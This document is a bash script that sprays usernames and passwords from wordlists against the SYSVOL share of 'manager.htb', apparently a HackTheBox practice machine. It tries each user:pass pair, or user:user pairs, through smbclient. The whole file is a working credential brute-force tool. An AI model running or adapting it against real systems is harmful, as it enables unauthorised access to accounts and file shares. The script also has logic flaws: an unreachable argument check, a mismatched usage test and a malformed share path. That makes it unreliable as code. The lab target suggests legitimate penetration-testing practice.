#!/bin/bash

# Check if a filename is provided as a command line argument
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <user filename> <pass filename>"
    exit 1
fi

filename="$1"
filename2="$2"

# Check if the file exists
if [ ! -f "$filename" ]; then
    echo "File not found: $filename"
    exit 1
fi

# Optionally run, if we have 1 file we dont need to run this
if [ "$#" -gt 1  ]; then
	# Check if second file exists
	if [ ! -f "$filename2" ]; then
    		echo "File not found: $filename2"
    		exit 1
	fi
elif [ "$#" -gt 2 ]; then
	echo "[-] Too Many Params Entered!"
	exit 1
fi

echo "[*] Preparing Action. . ."

# Read and output each line of the file 1
while IFS= read -r line
do
	if [ "$#" == 2 ]; then
		while IFS= read -r line2
		do
			echo ""
			echo "[*] Testing $line:$line2"
			# Send in user:pass style credentials to SMB
			smbclient -U "$line%$line2" //manager.htb////SYSVOL
		done < "$filename2"
	else
		echo""
		echo "[*] Testing $line:$line"
		# Send in user:user style credential to SMB
		smbclient -U "$line%$line" //manager.htb//SYSVOL
	fi
done < "$filename"

echo "[+] Process Closing"
